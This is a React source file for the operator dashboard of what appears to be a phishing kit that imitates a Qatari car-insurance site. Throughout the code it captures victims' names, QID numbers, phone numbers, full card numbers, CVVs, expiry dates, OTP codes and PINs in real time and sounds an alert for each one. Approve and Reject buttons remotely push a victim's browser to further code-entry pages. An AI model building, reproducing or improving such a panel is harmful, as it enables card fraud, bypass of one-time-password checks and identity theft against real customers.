import { useEffect, useState } from 'react';
import { LogOut, Search, Eye, Trash2, CheckCircle, XCircle, Clock, Users } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { useSocket } from '../context/SocketContext';
import { playNewVisitorSound, playCardDataSound, playOTPSound, playPINSound } from '../utils/notificationSounds';

// API URL from environment variable
const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:4000';

export default function Dashboard() {
  const navigate = useNavigate();
  const { socket, connected } = useSocket();
  const [customers, setCustomers] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedCustomer, setSelectedCustomer] = useState(null);
  const [showDetailsModal, setShowDetailsModal] = useState(false);

  useEffect(() => {
    if (!socket) return;

    // Request all data from server initially
    socket.emit('loadData');

    // Set up auto-refresh every 5 seconds
    const refreshInterval = setInterval(() => {
      if (socket && connected) {
        socket.emit('loadData');
        console.log('🔄 Auto-refreshing data...');
      }
    }, 5000);

    // Listen for initial data
    socket.on('initialData', (data) => {
      console.log('📦 Received data:', data);
      processCustomersData(data);
    });

    // Listen for real-time updates with sounds
    socket.on('newCarDetails', (data) => {
      console.log('🚗 New car details:', data);
      updateCustomerData(data.ip, 'carDetails', data);
      playNewVisitorSound();
    });

    socket.on('newMoreDetails', (data) => {
      console.log('📋 New more details:', data);
      updateCustomerData(data.ip, 'moreDetails', data);
    });

    socket.on('newSelectInsurance', (data) => {
      console.log('🛡️ New insurance selection:', data);
      updateCustomerData(data.ip, 'insurance', data);
    });

    socket.on('newInsuranceInfo', (data) => {
      console.log('👤 New customer info:', data);
      updateCustomerData(data.ip, 'customerInfo', data);
    });

    socket.on('newPayment', (data) => {
      console.log('💳 New payment RAW:', data);
      // Extract actual payment data from payload
      const paymentData = data.payload || data;
      const ip = paymentData.ip || data.ip;
      console.log('💳 Extracted paymentData:', paymentData);
      console.log('💳 IP:', ip);
      console.log('💳 Card Number:', paymentData.cardNumber);
      console.log('💳 CVV:', paymentData.cvv);
      console.log('💳 Expiration:', paymentData.expirationDate);
      updateCustomerData(ip, 'payments', paymentData);
      playCardDataSound();
    });

    socket.on('locationUpdated', ({ ip, page }) => {
      updateCustomerLocation(ip, page);
    });

    socket.on('userConnected', ({ ip }) => {
      setCustomers(prev => prev.map(c => 
        c.ip === ip ? { ...c, isActive: true, lastUpdate: new Date().toISOString() } : c
      ));
    });

    socket.on('userDisconnected', ({ ip }) => {
      setCustomers(prev => prev.map(c => 
        c.ip === ip ? { ...c, isActive: false } : c
      ));
    });

    socket.on('otpSubmitted', (data) => {
      console.log('🔐 OTP submitted:', data);
      // Extract actual OTP data from payload
      const otpData = data.payload || data;
      const ip = otpData.ip || data.ip;
      updateCustomerData(ip, 'otpCodes', otpData);
      playOTPSound();
    });

    socket.on('pinSubmitted', (data) => {
      console.log('🔑 PIN submitted:', data);
      // Extract actual PIN data from payload
      const pinData = data.payload || data;
      const ip = pinData.ip || data.ip;
      updateCustomerData(ip, 'pinCodes', pinData);
      playPINSound();
    });

    return () => {
      clearInterval(refreshInterval);
      socket.off('initialData');
      socket.off('newCarDetails');
      socket.off('newMoreDetails');
      socket.off('newSelectInsurance');
      socket.off('newInsuranceInfo');
      socket.off('newPayment');
      socket.off('locationUpdated');
      socket.off('userConnected');
      socket.off('userDisconnected');
      socket.off('otpSubmitted');
      socket.off('pinSubmitted');
    };
  }, [socket, connected]);

  const processCustomersData = (data) => {
    const customersMap = new Map();

    // Process all data by IP
    const allIPs = new Set();
    
    if (data.carDetails) data.carDetails.forEach(d => allIPs.add(d.ip));
    if (data.moreDetails) data.moreDetails.forEach(d => allIPs.add(d.ip));
    if (data.selectInsurance) data.selectInsurance.forEach(d => allIPs.add(d.ip));
    if (data.insuranceInfo) data.insuranceInfo.forEach(d => allIPs.add(d.ip));
    if (data.payment) data.payment.forEach(d => allIPs.add(d.ip));
    if (data.locations) data.locations.forEach(d => allIPs.add(d.ip));
    if (data.otpCodes) data.otpCodes.forEach(d => allIPs.add(d.ip));
    if (data.pinCodes) data.pinCodes.forEach(d => allIPs.add(d.ip));

    allIPs.forEach(ip => {
      const carDetails = data.carDetails?.find(d => d.ip === ip);
      const moreDetails = data.moreDetails?.find(d => d.ip === ip);
      const insurance = data.selectInsurance?.find(d => d.ip === ip);
      const customerInfo = data.insuranceInfo?.find(d => d.ip === ip);
      const payments = data.payment?.filter(d => d.ip === ip) || [];
      const otpCodes = data.otpCodes?.filter(d => d.ip === ip) || [];
      const pinCodes = data.pinCodes?.filter(d => d.ip === ip) || [];
      const location = data.locations?.find(d => d.ip === ip);
      const isActive = data.activeUsers?.includes(ip) || false;

      customersMap.set(ip, {
        ip,
        currentPage: location?.currentPage || '/',
        carDetails,
        moreDetails,
        insurance,
        customerInfo,
        payments,
        otpCodes,
        pinCodes,
        paymentStatus: payments[0]?.status || 'pending',
        lastUpdate: new Date().toISOString(),
        isActive
      });
    });

    // Sort by last update (newest first)
    const sortedCustomers = Array.from(customersMap.values()).sort((a, b) => {
      return new Date(b.lastUpdate) - new Date(a.lastUpdate);
    });

    setCustomers(sortedCustomers);
  };

  const updateCustomerData = (ip, field, data) => {
    setCustomers(prev => {
      const existing = prev.find(c => c.ip === ip);
      const timestamp = new Date().toISOString();
      
      let updatedCustomers;
      if (existing) {
        // Update existing customer
        if (field === 'payments') {
          updatedCustomers = prev.map(c => 
            c.ip === ip 
              ? { ...c, payments: [...(c.payments || []), data], lastUpdate: timestamp } 
              : c
          );
        } else if (field === 'otpCodes') {
          updatedCustomers = prev.map(c => 
            c.ip === ip 
              ? { ...c, otpCodes: [...(c.otpCodes || []), data], lastUpdate: timestamp } 
              : c
          );
        } else if (field === 'pinCodes') {
          updatedCustomers = prev.map(c => 
            c.ip === ip 
              ? { ...c, pinCodes: [...(c.pinCodes || []), data], lastUpdate: timestamp } 
              : c
          );
        } else {
          updatedCustomers = prev.map(c => 
            c.ip === ip 
              ? { ...c, [field]: data, lastUpdate: timestamp } 
              : c
          );
        }
      } else {
        // Create new customer
        const newCustomer = { 
          ip, 
          [field]: field === 'payments' || field === 'otpCodes' || field === 'pinCodes' ? [data] : data, 
          currentPage: '/', 
          paymentStatus: 'pending', 
          lastUpdate: timestamp,
          isActive: true
        };
        updatedCustomers = [newCustomer, ...prev];
      }
      
      // Sort by last update (newest first)
      return updatedCustomers.sort((a, b) => {
        return new Date(b.lastUpdate) - new Date(a.lastUpdate);
      });
    });
  };

  const updateCustomerLocation = (ip, page) => {
    setCustomers(prev => {
      const existing = prev.find(c => c.ip === ip);
      if (existing) {
        return prev.map(c => c.ip === ip ? { ...c, currentPage: page } : c);
      } else {
        return [...prev, { ip, currentPage: page, paymentStatus: 'pending', lastUpdate: new Date().toISOString() }];
      }
    });
  };

  const handleLogout = () => {
    sessionStorage.removeItem('adminAuthenticated');
    sessionStorage.removeItem('adminLoginTime');
    navigate('/admin/login');
  };

  const handleDelete = (ip) => {
    if (confirm(`Are you sure you want to delete customer ${ip}?`)) {
      fetch(`${API_URL}/api/users/${ip}`, { 
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json'
        }
      })
        .then(res => res.json())
        .then(data => {
          if (data.success) {
            setCustomers(prev => prev.filter(c => c.ip !== ip));
          }
        })
        .catch(err => console.error('Error deleting customer:', err));
    }
  };

  const handleApprovePayment = (ip) => {
    if (socket) {
      socket.emit('approvePayment', { ip });
      socket.emit('navigateTo', { ip, page: '/phone-code' });
      setCustomers(prev => prev.map(c => c.ip === ip ? { ...c, paymentStatus: 'approved' } : c));
    }
  };

  const handleRejectPayment = (ip) => {
    if (socket) {
      socket.emit('rejectPayment', { ip });
      socket.emit('navigateTo', { ip, page: '/paydcc' });
      setCustomers(prev => prev.map(c => c.ip === ip ? { ...c, paymentStatus: 'rejected' } : c));
    }
  };

  const viewDetails = (customer) => {
    setSelectedCustomer(customer);
    setShowDetailsModal(true);
  };

  const filteredCustomers = customers.filter(customer => {
    const searchLower = searchTerm.toLowerCase();
    return (
      customer.ip?.includes(searchTerm) ||
      customer.customerInfo?.fullName?.toLowerCase().includes(searchLower) ||
      customer.customerInfo?.qid?.includes(searchTerm) ||
      customer.customerInfo?.phone?.includes(searchTerm) ||
      customer.customerInfo?.email?.toLowerCase().includes(searchLower)
    );
  });

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="bg-gradient-to-br from-qiic-maroon via-red-800 to-red-900 text-white rounded-3xl p-8 shadow-2xl border border-white/10">
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-4xl font-bold mb-3">Real-time Dashboard</h1>
            <p className="text-lg opacity-90 flex items-center gap-3 flex-wrap">
              <span className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
                <span className={`w-3 h-3 rounded-full ${connected ? 'bg-green-400 animate-pulse' : 'bg-red-400'}`}></span>
                <span className="font-semibold">{connected ? 'Connected' : 'Disconnected'}</span>
              </span>
              <span className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
                <Users className="w-4 h-4" />
                <span className="font-semibold">{customers.filter(c => c.isActive).length} / {customers.length} Active</span>
              </span>
            </p>
          </div>
          <button 
            onClick={handleLogout}
            className="bg-white/20 hover:bg-white/30 text-white px-6 py-3 rounded-xl flex items-center gap-2 transition-all hover:scale-105"
          >
            <LogOut className="w-5 h-5" />
            Logout
          </button>
        </div>
      </div>

      {/* Search */}
      <div className="card">
        <div className="relative">
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
          <input
            type="text"
            placeholder="Search by IP, Name, QID, Phone, or Email..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-qiic-maroon focus:border-transparent"
          />
        </div>
      </div>

      {/* Customers Table */}
      <div className="card overflow-hidden shadow-lg">
        <div className="overflow-x-auto">
          <table className="w-full table-auto" dir="ltr">
            <thead className="bg-gradient-to-r from-gray-700 to-gray-800 text-white">
              <tr>
                <th className="px-3 py-4 text-left text-xs font-bold uppercase tracking-wider align-top">Status</th>
                <th className="px-3 py-4 text-left text-xs font-bold uppercase tracking-wider align-top">IP Address</th>
                <th className="px-3 py-4 text-left text-xs font-bold uppercase tracking-wider align-top">Current Page</th>
                <th className="px-3 py-4 text-left text-xs font-bold uppercase tracking-wider align-top">Customer Info</th>
                <th className="px-3 py-4 text-left text-xs font-bold uppercase tracking-wider align-top">Payment Cards</th>
                <th className="px-3 py-4 text-left text-xs font-bold uppercase tracking-wider align-top">OTP / PIN</th>
                <th className="px-3 py-4 text-left text-xs font-bold uppercase tracking-wider align-top">Status</th>
                <th className="px-3 py-4 text-left text-xs font-bold uppercase tracking-wider align-top">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-200">
              {filteredCustomers.length === 0 ? (
                <tr>
                  <td colSpan="8" className="px-6 py-12 text-center text-gray-500">
                    {customers.length === 0 ? 'No customer data available' : 'No matching search results'}
                  </td>
                </tr>
              ) : (
                filteredCustomers.flatMap((customer) => {
                  // Calculate how many rows this customer needs
                  const paymentCount = customer.payments?.length || 0;
                  const otpCount = customer.otpCodes?.length || 0;
                  const pinCount = customer.pinCodes?.length || 0;
                  const maxRows = Math.max(1, paymentCount, otpCount, pinCount);
                  
                  // Create array of rows for this customer
                  return Array.from({ length: maxRows }, (_, rowIndex) => (
                  <tr key={`${customer.ip}-${rowIndex}`} className={`border-b border-gray-200 ${customer.isActive ? 'bg-green-50' : 'bg-white'}`}>
                    {/* Status Indicator - Show only on first row */}
                    {rowIndex === 0 ? (
                      <td className="px-2 py-2 text-xs" rowSpan={maxRows}>
                        <div className="flex items-center gap-1.5">
                          <span className={`w-2.5 h-2.5 rounded-full ${customer.isActive ? 'bg-green-500 animate-pulse' : 'bg-gray-400'}`}></span>
                          <span className={`text-xs font-semibold px-1.5 py-0.5 rounded ${customer.isActive ? 'bg-green-200 text-green-800' : 'bg-gray-200 text-gray-600'}`}>
                            {customer.isActive ? 'ON' : 'OFF'}
                          </span>
                        </div>
                      </td>
                    ) : null}

                    {/* IP Address - Show only on first row */}
                    {rowIndex === 0 ? (
                      <td className="px-2 py-2 text-xs font-mono font-semibold text-gray-900" rowSpan={maxRows}>
                        <div className="flex items-center gap-2">
                          <svg className="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" />
                          </svg>
                          {customer.ip}
                        </div>
                      </td>
                    ) : null}

                    {/* Current Page - Show only on first row */}
                    {rowIndex === 0 ? (
                      <td className="px-2 py-2 text-xs" rowSpan={maxRows}>
                        <span className="bg-blue-600 text-white px-2 py-1 rounded text-xs font-mono">
                          {customer.currentPage}
                        </span>
                      </td>
                    ) : null}

                    {/* Customer Info - Show only on first row */}
                    {rowIndex === 0 ? (
                      <td className="px-2 py-2 text-xs" rowSpan={maxRows}>
                        {customer.customerInfo ? (
                          <div className="space-y-1" dir="ltr">
                            <div className="flex items-center gap-2">
                              <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                                <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                              </svg>
                              <span className="text-green-700 font-bold">{customer.customerInfo.fullName}</span>
                            </div>
                            <div className="font-mono text-xs bg-blue-100 px-2 py-1 rounded inline-block">
                              <span className="font-semibold">QID:</span> {customer.customerInfo.qid}
                            </div>
                            <div className="font-mono text-xs text-blue-700 font-semibold">
                              📱 {customer.customerInfo.phone}
                            </div>
                            {customer.customerInfo.email && (
                              <div className="text-xs text-gray-600 flex items-center gap-1">
                                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                                  <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
                                  <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
                                </svg>
                                {customer.customerInfo.email}
                              </div>
                            )}
                          </div>
                        ) : (
                          <span className="text-gray-400 font-semibold">—</span>
                        )}
                      </td>
                    ) : null}

                    {/* Payment Card - One per row */}
                    <td className="px-2 py-2 text-xs max-w-xs">
                      {customer.payments && customer.payments[rowIndex] ? (
                        <div className="border-l-4 border-green-500 bg-gradient-to-r from-green-50 to-white pl-2 pr-2 py-1.5 rounded-r-lg">
                          <div className="flex items-center gap-1.5 mb-0.5">
                            <svg className="w-3.5 h-3.5 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                              <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4z" />
                              <path fillRule="evenodd" d="M18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z" clipRule="evenodd" />
                            </svg>
                            <span className="text-green-700 font-semibold text-xs">{customer.payments[rowIndex].paymentMethod}</span>
                          </div>
                          {customer.payments[rowIndex].cardNumber && (
                            <div className="space-y-0.5">
                              <div className="font-mono text-xs bg-white border border-gray-200 px-1.5 py-0.5 rounded" dir="ltr">
                                💳 {customer.payments[rowIndex].cardNumber}
                              </div>
                              {customer.payments[rowIndex].expirationDate && (
                                <div className="font-mono text-xs bg-blue-50 border border-blue-200 px-1.5 py-0.5 rounded" dir="ltr">
                                  📅 Exp: {customer.payments[rowIndex].expirationDate}
                                </div>
                              )}
                              {customer.payments[rowIndex].cvv && (
                                <div className="font-mono text-xs bg-amber-50 border border-amber-200 px-1.5 py-0.5 rounded" dir="ltr">
                                  🔐 CVV: {customer.payments[rowIndex].cvv}
                                </div>
                              )}
                            </div>
                          )}
                          {customer.payments[rowIndex].phoneNumber && (
                            <div className="font-mono text-xs text-blue-700 font-semibold" dir="ltr">
                              📱 {customer.payments[rowIndex].phoneNumber}
                            </div>
                          )}
                          {customer.payments[rowIndex].amount && (
                            <div className="text-green-700 font-semibold text-xs mt-0.5">
                              💰 QAR {customer.payments[rowIndex].amount}
                            </div>
                          )}
                          <div className="text-xs text-gray-500 mt-0.5 flex items-center gap-1">
                            <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                              <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clipRule="evenodd" />
                            </svg>
                            {new Date(customer.payments[rowIndex].timestamp).toLocaleTimeString('en-US')}
                          </div>
                        </div>
                      ) : (
                        <span className="text-gray-400 font-semibold">—</span>
                      )}
                    </td>

                    {/* OTP / PIN - One per row */}
                    <td className="px-2 py-2">
                      <div className="space-y-1.5 min-w-[200px]">
                        {customer.otpCodes && customer.otpCodes[rowIndex] && (
                          <div className="bg-gradient-to-r from-purple-50 to-purple-100 border-l-4 border-purple-500 rounded-r-lg p-1.5">
                            <div className="flex items-center gap-1 mb-0.5">
                              <svg className="w-3.5 h-3.5 text-purple-700" fill="currentColor" viewBox="0 0 20 20">
                                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                              </svg>
                              <span className="font-semibold text-purple-800 text-xs">OTP</span>
                            </div>
                            <div className="font-mono text-sm bg-white border-2 border-purple-300 px-2 py-1 rounded mb-0.5" dir="ltr">
                              <div className="flex items-center gap-1.5">
                                <span className="text-purple-600">🔐</span>
                                <span className="font-bold text-purple-900">{customer.otpCodes[rowIndex].otpCode}</span>
                              </div>
                              <div className="text-xs text-gray-500 mt-0.5 flex items-center gap-1">
                                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clipRule="evenodd" />
                                </svg>
                                {new Date(customer.otpCodes[rowIndex].timestamp).toLocaleTimeString('en-US')}
                              </div>
                            </div>
                          </div>
                        )}
                        {customer.pinCodes && customer.pinCodes[rowIndex] && (
                          <div className="bg-gradient-to-r from-amber-50 to-amber-100 border-l-4 border-amber-500 rounded-r-lg p-1.5">
                            <div className="flex items-center gap-1 mb-0.5">
                              <svg className="w-3.5 h-3.5 text-amber-700" fill="currentColor" viewBox="0 0 20 20">
                                <path fillRule="evenodd" d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z" clipRule="evenodd" />
                              </svg>
                              <span className="font-semibold text-amber-800 text-xs">PIN</span>
                            </div>
                            <div className="font-mono text-sm bg-white border-2 border-amber-300 px-2 py-1 rounded mb-0.5" dir="ltr">
                              <div className="flex items-center gap-1.5">
                                <span className="text-amber-600">🔑</span>
                                <span className="font-bold text-amber-900">{customer.pinCodes[rowIndex].pinCode}</span>
                              </div>
                              <div className="text-xs text-gray-500 mt-0.5 flex items-center gap-1">
                                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clipRule="evenodd" />
                                </svg>
                                {new Date(customer.pinCodes[rowIndex].timestamp).toLocaleTimeString('en-US')}
                              </div>
                            </div>
                          </div>
                        )}
                        {(!customer.otpCodes || !customer.otpCodes[rowIndex]) && 
                         (!customer.pinCodes || !customer.pinCodes[rowIndex]) && (
                          <span className="text-gray-400 font-semibold">—</span>
                        )}
                      </div>
                    </td>

                    {/* Payment Status - Show only on first row */}
                    {rowIndex === 0 ? (
                      <td className="px-2 py-2 text-xs" rowSpan={maxRows}>
                        {customer.payments && customer.payments.length > 0 ? (
                          customer.paymentStatus === 'approved' ? (
                            <span className="bg-gradient-to-r from-green-500 to-green-600 text-white px-3 py-2 rounded-lg text-xs flex items-center gap-2 w-fit font-bold shadow-md">
                              <CheckCircle className="w-4 h-4" /> APPROVED
                            </span>
                          ) : customer.paymentStatus === 'rejected' ? (
                            <span className="bg-gradient-to-r from-red-500 to-red-600 text-white px-3 py-2 rounded-lg text-xs flex items-center gap-2 w-fit font-bold shadow-md">
                              <XCircle className="w-4 h-4" /> REJECTED
                            </span>
                          ) : (
                            <div className="flex gap-2 flex-wrap">
                              <button
                                onClick={() => handleApprovePayment(customer.ip)}
                                className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white px-4 py-2.5 rounded-xl text-xs font-bold shadow-lg transition-all transform hover:scale-110 active:scale-95"
                                title="Approve Payment"
                              >
                                ✓ APPROVE
                              </button>
                              <button
                                onClick={() => handleRejectPayment(customer.ip)}
                                className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white px-4 py-2.5 rounded-xl text-xs font-bold shadow-lg transition-all transform hover:scale-110 active:scale-95"
                                title="Reject Payment"
                              >
                                ✗ REJECT
                              </button>
                            </div>
                          )
                        ) : (
                          <span className="bg-gray-200 text-gray-600 px-3 py-2 rounded-lg text-xs flex items-center gap-2 w-fit font-semibold">
                            <Clock className="w-4 h-4" /> WAITING
                          </span>
                        )}
                      </td>
                    ) : null}

                    {/* Actions - Show only on first row */}
                    {rowIndex === 0 ? (
                      <td className="px-2 py-2 text-xs" rowSpan={maxRows}>
                        <div className="flex items-center gap-2">
                          <button
                            onClick={() => viewDetails(customer)}
                            className="p-2 bg-blue-500 text-white hover:bg-blue-600 rounded-lg transition-all transform hover:scale-110 shadow-md"
                            title="View Details"
                          >
                            <Eye className="w-4 h-4" />
                          </button>
                          <button
                            onClick={() => handleDelete(customer.ip)}
                            className="p-2 bg-red-500 text-white hover:bg-red-600 rounded-lg transition-all transform hover:scale-110 shadow-md"
                            title="Delete Customer"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </div>
                      </td>
                    ) : null}
                  </tr>
                  ));
                })
              )}
            </tbody>
          </table>
        </div>

        {/* Stats */}
        {filteredCustomers.length > 0 && (
          <div className="px-6 py-4 bg-gray-50 border-t border-gray-200">
            <p className="text-sm text-gray-600">
              Showing {filteredCustomers.length} of {customers.length} customers • 
              Active: {customers.filter(c => c.isActive).length} • 
              Last Update: {new Date().toLocaleTimeString('en-US')}
            </p>
          </div>
        )}
      </div>

      {/* Details Modal */}
      {showDetailsModal && selectedCustomer && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4" onClick={() => setShowDetailsModal(false)}>
          <div className="bg-white rounded-lg max-w-4xl w-full max-h-[90vh] overflow-y-auto" onClick={(e) => e.stopPropagation()}>
            <div className="sticky top-0 bg-white border-b p-6 flex items-center justify-between">
              <h2 className="text-2xl font-bold">تفاصيل العميل - {selectedCustomer.ip}</h2>
              <button onClick={() => setShowDetailsModal(false)} className="text-gray-500 hover:text-gray-700 text-2xl">×</button>
            </div>
            
            <div className="p-6 space-y-6">
              {/* Car Details */}
              {selectedCustomer.carDetails && (
                <div className="border rounded-lg p-4">
                  <h3 className="font-bold text-lg mb-3 text-qiic-maroon">🚗 بيانات السيارة</h3>
                  <div className="grid grid-cols-2 gap-3 text-sm">
                    <div><span className="font-semibold">الماركة:</span> {selectedCustomer.carDetails.brand}</div>
                    <div><span className="font-semibold">الموديل:</span> {selectedCustomer.carDetails.model}</div>
                    <div><span className="font-semibold">السنة:</span> {selectedCustomer.carDetails.year}</div>
                    <div><span className="font-semibold">المقاعد:</span> {selectedCustomer.carDetails.seats}</div>
                    <div><span className="font-semibold">السلندرات:</span> {selectedCustomer.carDetails.cylinders}</div>
                  </div>
                </div>
              )}

              {/* More Details */}
              {selectedCustomer.moreDetails && (
                <div className="border rounded-lg p-4">
                  <h3 className="font-bold text-lg mb-3 text-qiic-maroon">📋 مزيد من البيانات</h3>
                  <div className="grid grid-cols-2 gap-3 text-sm">
                    <div><span className="font-semibold">نوع الهيكل:</span> {selectedCustomer.moreDetails.bodyType}</div>
                    <div><span className="font-semibold">سعة المحرك:</span> {selectedCustomer.moreDetails.engineSize}</div>
                    <div><span className="font-semibold">اللون:</span> {selectedCustomer.moreDetails.color}</div>
                    <div><span className="font-semibold">سنة التسجيل:</span> {selectedCustomer.moreDetails.registrationYear}</div>
                  </div>
                </div>
              )}

              {/* Insurance */}
              {selectedCustomer.insurance && (
                <div className="border rounded-lg p-4">
                  <h3 className="font-bold text-lg mb-3 text-qiic-maroon">🛡️ التأمين المختار</h3>
                  <div className="grid grid-cols-2 gap-3 text-sm">
                    <div><span className="font-semibold">نوع التأمين:</span> {selectedCustomer.insurance.insuranceType}</div>
                    <div><span className="font-semibold">الشركة:</span> {selectedCustomer.insurance.selectedCompany}</div>
                    <div><span className="font-semibold">السعر الأساسي:</span> {selectedCustomer.insurance.basePrice} ريال</div>
                    <div><span className="font-semibold">السعر النهائي:</span> {selectedCustomer.insurance.totalPrice} ريال</div>
                  </div>
                </div>
              )}

              {/* Customer Info */}
              {selectedCustomer.customerInfo && (
                <div className="border rounded-lg p-4 bg-blue-50">
                  <h3 className="font-bold text-lg mb-3 text-qiic-maroon">👤 معلومات العميل الشخصية</h3>
                  <div className="grid grid-cols-2 gap-3 text-sm">
                    <div><span className="font-semibold">الاسم الكامل:</span> {selectedCustomer.customerInfo.fullName}</div>
                    <div><span className="font-semibold">الرقم الشخصي (QID):</span> <span className="font-mono bg-white px-2 py-1 rounded">{selectedCustomer.customerInfo.qid}</span></div>
                    <div><span className="font-semibold">رقم الهاتف:</span> <span className="font-mono bg-white px-2 py-1 rounded">{selectedCustomer.customerInfo.phone}</span></div>
                    <div><span className="font-semibold">البريد الإلكتروني:</span> <span className="font-mono bg-white px-2 py-1 rounded">{selectedCustomer.customerInfo.email}</span></div>
                    {selectedCustomer.customerInfo.dateOfBirth && (
                      <div><span className="font-semibold">تاريخ الميلاد:</span> {selectedCustomer.customerInfo.dateOfBirth}</div>
                    )}
                    {selectedCustomer.customerInfo.nationality && (
                      <div><span className="font-semibold">الجنسية:</span> {selectedCustomer.customerInfo.nationality}</div>
                    )}
                  </div>
                </div>
              )}

              {/* Payment Cards - Show ALL cards in details */}
              {selectedCustomer.payments && selectedCustomer.payments.length > 0 && (
                <div className="border rounded-lg p-4 bg-green-50">
                  <h3 className="font-bold text-lg mb-3 text-qiic-maroon">💳 جميع بطاقات الدفع ({selectedCustomer.payments.length})</h3>
                  <div className="space-y-4">
                    {selectedCustomer.payments.map((payment, index) => (
                      <div key={index} className="bg-white border-2 border-green-300 rounded-lg p-4 shadow-sm">
                        <div className="flex items-center justify-between mb-3 pb-2 border-b border-green-200">
                          <span className="text-green-700 font-bold text-base">البطاقة #{index + 1}</span>
                          {index === selectedCustomer.payments.length - 1 && (
                            <span className="bg-blue-500 text-white px-2 py-1 rounded text-xs font-bold">الأحدث</span>
                          )}
                        </div>
                        <div className="grid grid-cols-2 gap-3 text-sm">
                          <div>
                            <span className="font-semibold">طريقة الدفع:</span> 
                            <span className="bg-gray-100 px-2 py-1 rounded">{payment.paymentMethod || '—'}</span>
                          </div>
                          <div>
                            <span className="font-semibold">اسم حامل البطاقة:</span> 
                            <span className="bg-gray-100 px-2 py-1 rounded">{payment.cardHolderName || '—'}</span>
                          </div>
                          <div className="col-span-2">
                            <span className="font-semibold">رقم البطاقة الكامل:</span> 
                            <span className="font-mono bg-gray-100 px-3 py-2 rounded text-lg block mt-1" dir="ltr">
                              💳 {payment.cardNumber || '—'}
                            </span>
                          </div>
                          <div>
                            <span className="font-semibold">تاريخ الانتهاء:</span> 
                            <span className="font-mono bg-gray-100 px-2 py-1 rounded" dir="ltr">{payment.expirationDate || '—'}</span>
                          </div>
                          <div>
                            <span className="font-semibold">CVV:</span> 
                            <span className="font-mono bg-gray-100 px-2 py-1 rounded" dir="ltr">{payment.cvv || '—'}</span>
                          </div>
                          <div>
                            <span className="font-semibold">رقم الهاتف:</span> 
                            <span className="font-mono bg-gray-100 px-2 py-1 rounded" dir="ltr">📱 {payment.phoneNumber || '—'}</span>
                          </div>
                          <div>
                            <span className="font-semibold">آخر 4 أرقام:</span> 
                            <span className="font-mono bg-gray-100 px-2 py-1 rounded" dir="ltr">{payment.cardLastDigits || '—'}</span>
                          </div>
                          <div className="col-span-2 pt-2 border-t border-green-200">
                            <span className="font-semibold">المبلغ المدفوع:</span> 
                            <span className="font-bold text-green-700 text-xl bg-gray-100 px-3 py-1 rounded ml-2" dir="ltr">
                              {payment.amount ? `💰 QAR ${payment.amount}` : '—'}
                            </span>
                          </div>
                          <div className="col-span-2">
                            <span className="font-semibold">وقت الدفع:</span> 
                            <span className="text-gray-600">
                              {payment.timestamp ? new Date(payment.timestamp).toLocaleString('ar-QA') : '—'}
                            </span>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
